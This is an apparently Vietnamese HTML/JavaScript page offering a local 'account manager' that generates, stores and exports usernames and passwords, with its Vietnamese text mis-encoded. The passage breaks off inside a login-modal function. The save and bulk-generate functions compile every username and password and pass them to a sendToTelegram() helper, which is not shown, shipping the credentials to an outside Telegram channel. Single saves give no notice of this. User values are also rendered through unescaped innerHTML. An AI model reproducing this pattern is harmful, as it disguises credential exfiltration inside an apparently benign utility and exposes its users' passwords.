<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Qu·∫£n L√Ω T√†i Kho·∫£n</title>
  <style>
 * {
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', sans-serif;
  background: linear-gradient(to bottom right, #e6f0ff, #f8fbff);
  color: #1c1c1c;
  padding: 30px;
}

h2, h3 {
  color: #0056b3;
  margin-bottom: 20px;
}

label {
  font-weight: 600;
  display: block;
  margin-top: 15px;
}

input[type="text"], input[type="number"], textarea, select {
  width: 100%;
  padding: 12px 14px;
  font-size: 16px;
  border-radius: 8px;
  border: 1px solid #d0d7de;
  background-color: #fff;
  transition: border-color 0.2s;
}

input:focus, select:focus, textarea:focus {
  border-color: #3399ff;
  outline: none;
}

.input-group {
  display: flex;
  gap: 10px;
  margin-top: 5px;
}

.input-group input {
  flex: 1;
}

.input-group button {
  background: #3399ff;
  color: #fff;
  border: none;
  padding: 10px 14px;
  border-radius: 8px;
  cursor: pointer;
  font-size: 14px;
  transition: background 0.2s;
}

.input-group button:hover {
  background: #267fe0;
}

button {
  background: #0056b3;
  color: white;
  border: none;
  padding: 10px 16px;
  border-radius: 8px;
  font-size: 14px;
  margin-top: 15px;
  margin-right: 10px;
  cursor: pointer;
  transition: background 0.2s;
}

button:hover {
  background: #003d80;
}

.account-list {
  background: #ffffff;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
  margin-top: 30px;
}

.account-item {
  padding: 12px 0;
  border-bottom: 1px solid #e0e0e0;
}

.account-item:last-child {
  border-bottom: none;
}

#copy-notification {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background-color: #323232;
  color: #fff;
  padding: 10px 16px;
  border-radius: 6px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.25);
  font-size: 14px;
  display: none;
  z-index: 9999;
  opacity: 0;
  transition: opacity 0.3s ease;
}

select {
  cursor: pointer;
}
input[type="checkbox"] {
  transform: scale(1.2);
  margin-right: 8px;
  cursor: pointer;
}
.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background-color: #0056b3;
  color: white;
  padding: 16px 24px;
  border-radius: 12px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  margin-bottom: 30px;
  flex-wrap: wrap;
}

.navbar-left .title {
  font-size: 30px; 
  font-weight: bold;
  white-space: nowrap; 
  overflow: visible; 
  text-overflow: clip; 
  max-width: none; 
}
.navbar-right {
  display: flex;
  align-items: center;
  gap: 16px;
}

.logo {
  height: 40px;
  width: 40px;
  border-radius: 8px;
  object-fit: contain;
}

.title {
  font-size: 22px;
  font-weight: bold;
}

.nav-link {
  display: flex;
  align-items: center;
  gap: 6px;
  color: white;
  text-decoration: none;
  font-weight: 500;
  font-size: 16px;
  padding: 8px 12px;
  border-radius: 8px;
  transition: background 0.2s;
  line-height: 1;
}

.nav-link:hover {
  background-color: #003d80;
}
.modal {
  display: none;
  position: fixed;
  z-index: 9999;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  justify-content: center;
  align-items: center;
}

.modal-content {
  position: relative;
  background-color: #fff;
  padding: 24px 24px 18px;
  border-radius: 16px;
  text-align: center;
  box-shadow: 0 4px 16px rgba(0,0,0,0.3);
  width: 360px;
  max-width: 95%;
}


.donate-img {
  max-width: 100%;
  max-height: 600px;
  border-radius: 12px;
}


.close-btn {
  position: absolute;
  top: 10px;
  right: 10px;
  background: #f44336;
  color: white;
  border: none;
  border-radius: 50%;
  font-size: 18px;
  width: 32px;
  height: 32px;
  cursor: pointer;
  line-height: 1;
  display: flex;
  align-items: center;
  justify-content: center;
}
/* Login Modal Style */
.login-modal {
  background: rgba(0, 0, 0, 0.6);
  z-index: 99999;
}

.wrapper {
  overflow: hidden;
  max-width: 390px;
  background: #fff;
  padding: 30px;
  border-radius: 15px;
  box-shadow: 0px 15px 20px rgba(0,0,0,0.1);
  animation: fadeIn 0.4s;
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(-20px); }
  to { opacity: 1; transform: translateY(0); }
}

.wrapper .title-text {
  display: flex;
  width: 200%;
}

.wrapper .title {
  width: 50%;
  font-size: 35px;
  font-weight: 600;
  text-align: center;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}

.wrapper .slide-controls {
  position: relative;
  display: flex;
  height: 50px;
  width: 100%;
  overflow: hidden;
  margin: 30px 0 10px 0;
  justify-content: space-between;
  border: 1px solid lightgrey;
  border-radius: 15px;
}

.slide-controls {
  position: relative;
  display: flex;
  height: 50px;
  width: 100%;
  margin: 30px 0 10px 0;
  justify-content: space-between;
  border: 1px solid lightgrey;
  border-radius: 15px;
  overflow: hidden; /* Th√™m d√≤ng n√†y */
}

.slide-controls .slide {
  height: 100%;
  width: 50%; /* ƒê·∫£m b·∫£o m·ªói tab chi·∫øm 50% */
  font-size: 18px;
  font-weight: 500;
  text-align: center;
  line-height: 50px; /* CƒÉn gi·ªØa theo chi·ªÅu d·ªçc */
  cursor: pointer;
  z-index: 1;
  transition: all 0.6s ease;
  margin: 0; /* Lo·∫°i b·ªè margin m·∫∑c ƒë·ªãnh */
  padding: 0; /* Lo·∫°i b·ªè padding m·∫∑c ƒë·ªãnh */
}

.slide-controls .slider-tab {
  position: absolute;
  height: 100%;
  width: 50%;
  left: 0;
  z-index: 0;
  border-radius: 15px;
  background: linear-gradient(to right, #003366, #004080, #0059b3, #0073e6);
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}
.title-text {
  font-size: 0; /* ·∫®n kho·∫£ng tr·ªëng gi·ªØa c√°c ph·∫ßn t·ª≠ inline */
}

.title {
  display: inline-block;
  width: 50%;
  font-size: 35px; 
  font-weight: 600;
  text-align: center;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
  vertical-align: top; 
}
input[type="radio"] {
  display: none;
}

#signup:checked ~ .slider-tab {
  left: 50%;
}

#signup:checked ~ label.signup {
  color: #fff;
  cursor: default;
  user-select: none;
}

#signup:checked ~ label.login {
  color: #000;
}

.wrapper .form-container {
  width: 100%;
  overflow: hidden;
}

.form-container .form-inner {
  display: flex;
  width: 200%;
}

.form-container .form-inner form {
  width: 50%;
  transition: all 0.6s cubic-bezier(0.68,-0.55,0.265,1.55);
}

.form-inner form .field {
  height: 50px;
  width: 100%;
  margin-top: 20px;
}

.form-inner form .field input {
  height: 100%;
  width: 100%;
  outline: none;
  padding-left: 15px;
  border-radius: 15px;
  border: 1px solid lightgrey;
  border-bottom-width: 2px;
  font-size: 17px;
  transition: all 0.3s ease;
}

.form-inner form .field input:focus {
  border-color: #1a75ff;
}

.form-inner form .field input::placeholder {
  color: #999;
  transition: all 0.3s ease;
}

form .field input:focus::placeholder {
  color: #1a75ff;
}

.form-inner form .pass-link {
  margin-top: 5px;
}

.form-inner form .signup-link {
  text-align: center;
  margin-top: 30px;
}

.form-inner form .pass-link a,
.form-inner form .signup-link a {
  color: #1a75ff;
  text-decoration: none;
}

.form-inner form .pass-link a:hover,
.form-inner form .signup-link a:hover {
  text-decoration: underline;
}

form .btn {
  height: 50px;
  width: 100%;
  border-radius: 15px;
  position: relative;
  overflow: hidden;
}

form .btn .btn-layer {
  height: 100%;
  width: 300%;
  position: absolute;
  left: -100%;
  background: linear-gradient(to right, #003366, #004080, #0059b3, #0073e6);
  border-radius: 15px;
  transition: all 0.4s ease;
}

form .btn:hover .btn-layer {
  left: 0;
}

form .btn input[type="submit"] {
  height: 100%;
  width: 100%;
  z-index: 1;
  position: relative;
  background: none;
  border: none;
  color: #fff;
  padding-left: 0;
  border-radius: 15px;
  font-size: 20px;
  font-weight: 500;
  cursor: pointer;
}
.login-modal {
  display: none; 
  position: fixed;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6);
  justify-content: center;
  align-items: center;
  z-index: 10000; 
}
.close-login-btn {
  position: absolute;
  top: 10px;      
  right: 10px;    
  background: transparent;
  border: none;
  font-size: 20px;
  cursor: pointer;
  color: #666;
  z-index: 1;     
  padding: 5px;
}

.close-login-btn:hover {
  color: #f44336; 
}

.wrapper {
  position: relative; 
}
/* Dark Mode */
body.dark-mode {
  background: linear-gradient(to bottom right, #1a1a2e, #16213e);
  color: #f0f0f0;
}

.dark-mode .account-list {
  background: #0f3460;
  color: #ffffff;
}

.dark-mode .navbar {
  background-color: #0f3460;
  box-shadow: 0 2px 8px rgba(0,0,0,0.3);
}

.dark-mode input[type="text"], 
.dark-mode input[type="number"], 
.dark-mode textarea, 
.dark-mode select {
  background-color: #1a1a2e;
  color: #ffffff;
  border-color: #2c3e50;
}

.dark-mode .account-item {
  border-bottom-color: #2c3e50;
}

.dark-mode button {
  background: #1a75ff;
}

.dark-mode button:hover {
  background: #005ce6;
}

.dark-mode .modal-content {
  background-color: #16213e;
  color: #ffffff;
}

.dark-mode .wrapper {
  background: #16213e;
  color: #ffffff;
}

.dark-mode .form-inner form .field input {
  background: #1a1a2e;
  color: #ffffff;
  border-color: #2c3e50;
}
#userDisplay {
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 5px;
}

#userDisplay:hover {
  background-color: #003d80;
}
.logout-btn {
  background: transparent;
  border: none;
  color: white;
  cursor: pointer;
  font-size: 16px;
  margin-left: 5px;
  padding: 0;
}

.logout-btn:hover {
  color: #ff6b6b;
}
.nav-link {
  display: flex;
  align-items: center;
  gap: 6px;
  color: white;
  text-decoration: none;
  font-weight: 500;
  font-size: 16px;
  padding: 8px 12px;
  border-radius: 8px;
  transition: background 0.2s;
  line-height: 1;
}
.nav-link:hover {
  background-color: #003d80;
}
.not-logged-in {
  opacity: 0.6;
  cursor: not-allowed;
  pointer-events: none;
}






  </style>
</head>
<body>
  <div id="loginModal" class="login-modal" style="display: none;">
  <div class="wrapper" style="margin: auto;">
    <button class="close-login-btn" onclick="hideLogin()">‚ùå</button>
   
    <div class="title-text">
      <div class="title login">KhoaHihi</div>
      <div class="title signup">KhoaHihi</div>
    </div>
    <div class="form-container">
      <div class="slide-controls">
        <input type="radio" name="slide" id="login" checked>
        <input type="radio" name="slide" id="signup">
        <label for="login" class="slide login">ƒêƒÉng nh·∫≠p</label>
        <label for="signup" class="slide signup">ƒêƒÉng K√Ω</label>
        <div class="slider-tab"></div>
      </div>
      <div class="form-inner">
        <form action="#" class="login">
          <div class="field">
            <input type="text" placeholder="T√™n ƒëƒÉng nh·∫≠p" required>
          </div>
          <div class="field">
            <input type="password" placeholder="M·∫≠t kh·∫©u" required>
          </div>
          <div class="pass-link"><a href="#">Qu√™n m·∫≠t kh·∫©u?</a></div>
          <div class="field btn">
            <div class="btn-layer"></div>
            <input type="submit" value="X√°c nh·∫≠n">
          </div>
          <div class="signup-link">Ch∆∞a c√≥ t√†i kho·∫£n? <a href="">ƒêƒÉng K√Ω</a></div>
        </form>
        <form action="#" class="signup">
          <div class="field">
            <input type="text" placeholder="T√™n ƒëƒÉng nh·∫≠p" required>
          </div>
          <div class="field">
            <input type="password" placeholder="M·∫≠t kh·∫©u" required>
          </div>
          <div class="field">
            <input type="password" placeholder="X√°c nh·∫≠n m·∫≠t kh·∫©u" required>
          </div>
          <div class="field btn">
            <div class="btn-layer"></div>
            <input type="submit" value="X√°c nh·∫≠n">
          </div>
        </form>
      </div>
    </div>
  </div>
</div>


  <div class="navbar">
  <div class="navbar-left">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="Logo" class="logo">
    <span class="title">KhoaHihi Web - Qu·∫£n L√Ω T√†i Kho·∫£n</span>
  </div>
  <div class="navbar-right">
    <a href="#" class="nav-link" onclick="toggleDarkMode()">üåì Dark Mode</a>
    <a href="https://www.facebook.com/khoangdangg/" class="nav-link" target="_blank">üì¨ Li√™n h·ªá</a>
    <a href="#" class="nav-link" onclick="showDonate()">üíñ Donate</a>
   <a href="#" id="userDisplay" class="nav-link" style="display: none;" onclick="logout()" title="ƒêƒÉng xu·∫•t">
  üö™ <span id="usernameDisplay" style="font-weight: 500;"></span> <span style="opacity: 0.8;">| ƒêƒÉng xu·∫•t</span>
</a>


</span>
    <a href="#" id="loginBtn" class="nav-link" onclick="showLogin()">üîëƒêƒÉng nh·∫≠p</a>

  </div>
</div>
<div id="donateModal" class="modal">
  <div class="modal-content">
    <button class="close-btn" onclick="hideDonate()">‚ùå</button>
    <img src="1.jpg" alt="Donate QR" class="donate-img">
    <p style="margin-top: 10px;">C·∫£m ∆°n b·∫°n ƒë√£ ·ªßng h·ªô üíñ</p>
  </div>
</div>





  <h2>üìò T·∫°o & L∆∞u T√†i Kho·∫£n</h2>

  <label>üîñ Ghi ch√∫:</label>
  <input type="text" id="note" placeholder>

  <label>üîó Ti·ªÅn t·ªë t√†i kho·∫£n (t√πy ch·ªçn):</label>
  <input type="text" id="prefix" placeholder>

  <label>üë§ T√†i kho·∫£n:</label>
  <div class="input-group">
    <input type="text" id="username" placeholder>
    <button onclick="randomUsername()">üé≤ Random</button>
  </div>

  <label>üîë M·∫≠t kh·∫©u:</label>
  <div class="input-group">
    <input type="text" id="password" placeholder>
    <button onclick="randomPassword()">üé≤ Random</button>
  </div>
<div id="copy-notification">‚úÖ ƒê√£ copy v√†o clipboard!</div>
<div style="margin-top: 15px;">
  <label>üì¶ S·ªë l∆∞·ª£ng c·∫ßn random nhanh:</label>
  <div class="input-group">
    <input type="number" id="randomCount" value="5" min="1" max="100">
    <button onclick="bulkRandomAndSave()">‚ö° Random & L∆∞u Nhanh</button>
  </div>
</div>


  <button onclick="addAccount()">‚úÖ L∆∞u</button>
  <button onclick="randomUsername(); randomPassword();">üé≤ Random Nhanh </button>
  <button onclick="downloadAccounts()">‚¨áÔ∏è T·∫£i TXT</button>
  <button onclick="downloadSelected()">‚¨áÔ∏è T·∫£i TXT (ƒë√£ ch·ªçn)</button>
  <button onclick="clearAccounts()">üóëÔ∏è X√≥a t·∫•t c·∫£</button>
  <button onclick="deleteSelected()">üóëÔ∏è X√≥a (ƒë√£ ch·ªçn)</button>
  <button onclick="toggleSelectionMode()" id="selectionToggleBtn">üîò Ch·ªçn</button>



  <hr>

  <label>üìÇ L·ªçc danh s√°ch:</label>
<select id="filterType" onchange="applyFilter()" style="padding: 10px; border-radius: 6px; font-size: 16px;">
  <option value="all">-- Hi·ªÉn th·ªã t·∫•t c·∫£ --</option>
  <option value="newest">üïí M·ªõi nh·∫•t</option>
  <option value="oldest">üìú C≈© nh·∫•t</option>
  <option value="account">üîê Theo t√†i kho·∫£n (A-Z)</option>
  <option value="note">üìå Theo ghi ch√∫ (A-Z)</option>
</select>
<input type="text" id="subSearch" placeholder="üîç Nh·∫≠p ƒë·ªÉ l·ªçc th√™m..." 
       style="display:none; margin-top:10px; padding:10px; width:100%; border-radius:6px; font-size:16px;"
       oninput="applyFilter()">



  <div class="account-list" id="accountList">
    <h3>üìã Danh s√°ch ƒë√£ l∆∞u:</h3>
  </div>

  <script>
    let accounts = JSON.parse(localStorage.getItem("managed_accounts")) || [];
    let currentUser = localStorage.getItem('currentUser');


    function saveToLocal() {
  localStorage.setItem("managed_accounts", JSON.stringify(accounts));
}

  function renderList(sortBy = "all") {
  const list = document.getElementById("accountList");
  list.innerHTML = "<h3>üìã Danh s√°ch ƒë√£ l∆∞u:</h3>";

  let sorted = [...accounts];

  if (sortBy === "newest") {
    sorted.reverse(); // ƒë·∫£o ng∆∞·ª£c m·∫£ng
  } else if (sortBy === "account") {
    sorted.sort((a, b) => a.username.localeCompare(b.username));
  } else if (sortBy === "note") {
    sorted.sort((a, b) => (a.note || "").localeCompare(b.note || ""));
  }

  sorted.forEach((acc, i) => {
    const note = acc.note || "(kh√¥ng c√≥)";
    const username = acc.username;
    const password = acc.password;

    const div = document.createElement("div");
    div.className = "account-item";

    const copyText = `Ghi ch√∫: ${note}\nT√†i kho·∫£n: ${username}\nM·∫≠t kh·∫©u: ${password}`;

    div.innerHTML = `
      ${selectionMode ? `<input type="checkbox" class="account-checkbox" data-index="${i}" style="margin-bottom:5px;">` : ""}
      <strong>${i + 1}. Ghi ch√∫:</strong> ${note}<br>
      <strong>T√†i kho·∫£n:</strong> ${username}<br>
      <strong>M·∫≠t kh·∫©u:</strong> ${password}<br>
      <button onclick="copyToClipboard(\`${copyText}\`)" style="margin-top:5px;">üìã Copy All</button>
    `;
    list.appendChild(div);
  });
}
function applyFilter() {
  const type = document.getElementById("filterType").value;
  const subSearch = document.getElementById("subSearch");

  if (type === "account" || type === "note") {
    subSearch.style.display = "block";
  } else {
    subSearch.style.display = "none";
    subSearch.value = ""; // clear n·∫øu kh√¥ng d√πng
  }

  renderList(type, subSearch.value);
}


function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showCopyNotification("‚úÖ ƒê√£ copy v√†o clipboard!", "#4caf50");
  }).catch(() => {
    showCopyNotification("‚ùå Kh√¥ng th·ªÉ copy.", "#f44336");
  });
}

function showCopyNotification(message, bgColor) {
  const note = document.getElementById("copy-notification");
  note.textContent = message;
  note.style.backgroundColor = bgColor;
  note.style.display = "block";
  note.style.opacity = "1";

  setTimeout(() => {
    note.style.opacity = "0";
    setTimeout(() => {
      note.style.display = "none";
    }, 300);
  }, 2000);
}


    function isValidUsername(username) {
      return /^[a-z0-9]{6,32}$/.test(username);
    }

    function isValidPassword(password) {
      const lengthOK = password.length >= 6 && password.length <= 32;
      const hasLetter = /[a-zA-Z]/.test(password);
      const hasNumber = /[0-9]/.test(password);
      return lengthOK && hasLetter && hasNumber;
    }

    function addAccount() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  let note = document.getElementById("note").value.trim();
  
  if (!note) {
    note = new Date().toLocaleString();
  }

  if (!isValidUsername(username)) {
    alert("‚ùå T√†i kho·∫£n ph·∫£i c√≥ 6-32 k√Ω t·ª± ch·ªØ th∆∞·ªùng v√† s·ªë");
    return;
  }

  if (!isValidPassword(password)) {
    alert("‚ùå M·∫≠t kh·∫©u ph·∫£i c√≥ 6-32 k√Ω t·ª±, g·ªìm ch·ªØ v√† s·ªë");
    return;
  }

  // Th√™m v√†o danh s√°ch qu·∫£n l√Ω (kh√¥ng li√™n quan ƒë·∫øn user ƒëƒÉng nh·∫≠p)
  accounts.push({ username, password, note });
  saveToLocal();
  
  // Th√¥ng b√°o Telegram ch·ªâ cho d·ªØ li·ªáu qu·∫£n l√Ω
  const telegramMsg = `üìù *TH√äM T√ÄI KHO·∫¢N QU·∫¢N L√ù*\n\n` +
                     `üë§ Username: \`${username}\`\n` +
                     `üîë Password: \`${password}\`\n` +
                     `üìå Note: ${note}\n` +
                     `‚è∞ Time: ${new Date().toLocaleString()}`;
  
  sendToTelegram(telegramMsg).then(() => {
    showCopyNotification("‚úÖ ƒê√£ l∆∞u t√†i kho·∫£n qu·∫£n l√Ω!", "#4caf50");
  });

  renderList();
  document.getElementById("username").value = '';
  document.getElementById("password").value = '';
}
    function downloadAccounts()  {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
      let content = accounts.map((a, i) =>
        `${i + 1}. Ghi ch√∫: ${a.note || "(kh√¥ng c√≥)"}\nT√†i kho·∫£n: ${a.username}\nM·∫≠t kh·∫©u: ${a.password}\n`
      ).join('\n');

      const blob = new Blob([content], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "danh_sach_tai_khoan.txt";
      a.click();
      URL.revokeObjectURL(url);
    }
function downloadSelected() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const checkboxes = document.querySelectorAll(".account-checkbox:checked");
  if (checkboxes.length === 0) {
    showCopyNotification("‚ö†Ô∏è Ch∆∞a ch·ªçn d√≤ng n√†o ƒë·ªÉ t·∫£i!", "#ff9800");
    return;
  }

  let content = "";
  checkboxes.forEach(cb => {
    const index = parseInt(cb.getAttribute("data-index"));
    const a = accounts[index];
    content += `Ghi ch√∫: ${a.note || "(kh√¥ng c√≥)"}\nT√†i kho·∫£n: ${a.username}\nM·∫≠t kh·∫©u: ${a.password}\n\n`;
  });

  const blob = new Blob([content], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "da_chon_tai_khoan.txt";
  a.click();
  URL.revokeObjectURL(url);
}
function deleteSelected() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const checkboxes = document.querySelectorAll(".account-checkbox:checked");
  if (checkboxes.length === 0) {
    showCopyNotification("‚ö†Ô∏è Ch∆∞a ch·ªçn d√≤ng n√†o ƒë·ªÉ x√≥a!", "#ff9800");
    return;
  }

  const indexes = Array.from(checkboxes).map(cb => parseInt(cb.getAttribute("data-index")));
  // X√≥a t·ª´ cu·ªëi l√™n ƒë·ªÉ kh√¥ng sai ch·ªâ s·ªë
  indexes.sort((a, b) => b - a).forEach(i => accounts.splice(i, 1));

  saveToLocal();renderList(
  document.getElementById("filterType").value,
  document.getElementById("subSearch").value
);
  showCopyNotification("‚úÖ ƒê√£ x√≥a c√°c d√≤ng ƒë√£ ch·ªçn!", "#f44336");
}


let clearConfirming = false;

function clearAccounts()  {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  if (accounts.length === 0) {
    showCopyNotification("‚ö†Ô∏è Kh√¥ng c√≥ g√¨ ƒë·ªÉ x√≥a!", "#ff9800");
    return;
  }

  if (!clearConfirming) {
    clearConfirming = true;
    showCopyNotification("‚ö†Ô∏è B·∫°n c√≥ ch·∫Øc mu·ªën x√≥a kh√¥ng? Nh·∫•n l·∫°i ƒë·ªÉ x√°c nh·∫≠n.", "#ff9800");

    setTimeout(() => {
      clearConfirming = false;
    }, 3000); // H·∫øt hi·ªáu l·ª±c sau 3 gi√¢y
    return;
  }

  accounts = [];
  saveToLocal();
  renderList();
  showCopyNotification("‚úÖ ƒê√£ x√≥a t·∫•t c·∫£!", "#f44336");
  clearConfirming = false;
}


 function randomUsername(totalLength = 15) {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  let prefix = document.getElementById('prefix').value.trim();
if (!prefix) {
  prefix = "khoahihi"; // Ti·ªÅn t·ªë m·∫∑c ƒë·ªãnh
}

  const allowed = 'abcdefghijklmnopqrstuvwxyz0123456789';

  if (prefix.length > 12) {
    showCopyNotification("‚ùå Ti·ªÅn t·ªë kh√¥ng ƒë∆∞·ª£c qu√° 12 k√Ω t·ª±!", "#f44336");
    return;
  }

  if (prefix && !/^[a-z0-9]*$/.test(prefix)) {
    showCopyNotification("‚ùå Ti·ªÅn t·ªë ch·ªâ g·ªìm ch·ªØ th∆∞·ªùng v√† s·ªë!", "#f44336");
    return;
  }

  if (prefix.length >= totalLength) {
    showCopyNotification("‚ùå Ti·ªÅn t·ªë qu√° d√†i. T√†i kho·∫£n t·ªëi ƒëa 15 k√Ω t·ª±!", "#f44336");
    return;
  }

  const randomLength = totalLength - prefix.length;
  let suffix = '';
  for (let i = 0; i < randomLength; i++) {
    suffix += allowed.charAt(Math.floor(Math.random() * allowed.length));
  }

  document.getElementById('username').value = prefix + suffix;
}

    function randomPassword(length = 12) {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
      const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      const numbers = '0123456789';
      const symbols = '!@#$%';

      let result = '';
      result += letters[Math.floor(Math.random() * letters.length)];
      result += numbers[Math.floor(Math.random() * numbers.length)];

      const allChars = letters + numbers + symbols;
      for (let i = 2; i < length; i++) {
        result += allChars.charAt(Math.floor(Math.random() * allChars.length));
      }

      result = result.split('').sort(() => 0.5 - Math.random()).join('');
      document.getElementById('password').value = result;
    }
function renderList(sortBy = "all", searchKeyword = "") {
  const list = document.getElementById("accountList");
  list.innerHTML = "<h3>üìã Danh s√°ch ƒë√£ l∆∞u:</h3>";

  let sorted = [...accounts];

  if (sortBy === "newest") {
    sorted.reverse();
  } else if (sortBy === "account") {
    sorted.sort((a, b) => a.username.localeCompare(b.username));
  } else if (sortBy === "note") {
    sorted.sort((a, b) => (a.note || "").localeCompare(b.note || ""));
  }

  sorted.forEach((acc, i) => {
    const note = acc.note || "(kh√¥ng c√≥)";
    const username = acc.username;
    const password = acc.password;

    if (
      sortBy === "account" && !username.toLowerCase().includes(searchKeyword.toLowerCase())
      || sortBy === "note" && !note.toLowerCase().includes(searchKeyword.toLowerCase())
    ) {
      return;
    }

    const div = document.createElement("div");
    div.className = "account-item";

    const copyText = `Ghi ch√∫: ${note}\nT√†i kho·∫£n: ${username}\nM·∫≠t kh·∫©u: ${password}`;

    div.innerHTML = `
      ${selectionMode ? `<input type="checkbox" class="account-checkbox" data-index="${i}" style="margin-bottom:5px;">` : ""}
      <strong>${i + 1}. Ghi ch√∫:</strong> ${note}<br>
      <strong>T√†i kho·∫£n:</strong> ${username}<br>
      <strong>M·∫≠t kh·∫©u:</strong> ${password}<br>
      <button onclick="copyToClipboard(\`${copyText}\`)" style="margin-top:5px;">üìã Copy All</button>
    `;
    list.appendChild(div);
  });
}

function bulkRandomAndSave() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  const count = parseInt(document.getElementById("randomCount").value);
  let prefix = document.getElementById("prefix").value.trim();
  if (!prefix) {
    prefix = "khoahihi";
  }

  // Validate input
  if (isNaN(count) || count < 1 || count > 100) {
    showCopyNotification("‚ùå S·ªë l∆∞·ª£ng ph·∫£i t·ª´ 1 ƒë·∫øn 100!", "#f44336");
    return;
  }

  if (prefix.length > 12) {
    showCopyNotification("‚ùå Ti·ªÅn t·ªë kh√¥ng qu√° 12 k√Ω t·ª±!", "#f44336");
    return;
  }

  if (prefix && !/^[a-z0-9]*$/.test(prefix)) {
    showCopyNotification("‚ùå Ti·ªÅn t·ªë ch·ªâ ch·ªØ th∆∞·ªùng v√† s·ªë!", "#f44336");
    return;
  }

  const allowed = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const numbers = '0123456789';
  const symbols = '!@#$%';
  
  // Chu·∫©n b·ªã n·ªôi dung cho Telegram
  let telegramMsg = `‚ö° *T·∫†O ${count} T√ÄI KHO·∫¢N NG·∫™U NHI√äN*\n\n` +
                   `üîÑ Ti·ªÅn t·ªë: ${prefix}\n` +
                   `üìù Ghi ch√∫: ${document.getElementById("note").value.trim() || 'T·ª± ƒë·ªông'}\n\n` +
                   `üìã DANH S√ÅCH:\n`;

  for (let j = 0; j < count; j++) {
    // T·∫°o username
    const suffixLength = 15 - prefix.length;
    let suffix = '';
    for (let i = 0; i < suffixLength; i++) {
      suffix += allowed.charAt(Math.floor(Math.random() * allowed.length));
    }
    const username = prefix + suffix;

    // T·∫°o password
    let password = '';
    password += letters[Math.floor(Math.random() * letters.length)];
    password += numbers[Math.floor(Math.random() * numbers.length)];
    const allChars = letters + numbers + symbols;
    for (let i = 2; i < 12; i++) {
      password += allChars.charAt(Math.floor(Math.random() * allChars.length));
    }
    password = password.split('').sort(() => 0.5 - Math.random()).join('');

    // Th√™m v√†o danh s√°ch
    accounts.push({
      username,
      password,
      note: document.getElementById("note").value.trim() || new Date().toLocaleString()
    });

    // Th√™m v√†o n·ªôi dung Telegram
    telegramMsg += `\n${j+1}. ${username} | ${password}`;
  }

  // Th√™m th·ªùi gian v√†o th√¥ng b√°o
  telegramMsg += `\n\n‚è∞ ${new Date().toLocaleString()}`;

  // L∆∞u v√† hi·ªÉn th·ªã
  saveToLocal();
  renderList(
    document.getElementById("filterType").value,
    document.getElementById("subSearch").value
  );

  // G·ª≠i th√¥ng b√°o Telegram
  sendToTelegram(telegramMsg)
    .then(() => showCopyNotification(`‚úÖ ƒê√£ t·∫°o ${count} t√†i kho·∫£n v√† g·ª≠i Telegram!`, "#4caf50"))
    .catch(err => {
      console.error("L·ªói g·ª≠i Telegram:", err);
      showCopyNotification(`‚úÖ ƒê√£ t·∫°o ${count} t√†i kho·∫£n (nh∆∞ng l·ªói g·ª≠i Telegram)`, "#ff9800");
    });
}



  </script>

<script>
let selectionMode = false;

function toggleSelectionMode() {
  if (!isLoggedIn()) {
    showLoginRequired();
    return;
  }
  selectionMode = !selectionMode;
  renderList(
    document.getElementById("filterType").value,
    document.getElementById("subSearch").value
  );
  const btn = document.getElementById("selectionToggleBtn");
  btn.textContent = selectionMode ? "‚ùå H·ªßy ch·ªçn" : "üîò Ch·ªçn";
}

document.addEventListener('DOMContentLoaded', () => {
  // Ki·ªÉm tra dark mode
  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
  if (savedDarkMode) {
    document.body.classList.add('dark-mode');
    const darkModeBtn = document.querySelector('a[onclick="toggleDarkMode()"]');
    if (darkModeBtn) darkModeBtn.innerHTML = '‚òÄÔ∏è Light Mode';
  }
  
  // Ki·ªÉm tra tr·∫°ng th√°i ƒëƒÉng nh·∫≠p
  const currentUser = localStorage.getItem('currentUser');
  if (currentUser) {
    updateLoginUI(currentUser);
  }
});
function showDonate() {
  document.getElementById("donateModal").style.display = "flex";
}

function hideDonate() {
  document.getElementById("donateModal").style.display = "none";
}
// Login System
const loginText = document.querySelector(".title-text .login");
const loginForm = document.querySelector("form.login");
const loginBtn = document.querySelector("label.login");
const signupBtn = document.querySelector("label.signup");
const signupLink = document.querySelector("form .signup-link a");
const signupForm = document.querySelector("form.signup");
const forgotPasswordLink = document.querySelector(".pass-link a");

function showLogin() {
  document.getElementById("loginModal").style.display = "flex";
  document.body.style.overflow = "hidden"; // NgƒÉn scroll khi modal m·ªü
}

function hideLogin() {
  document.getElementById("loginModal").style.display = "none";
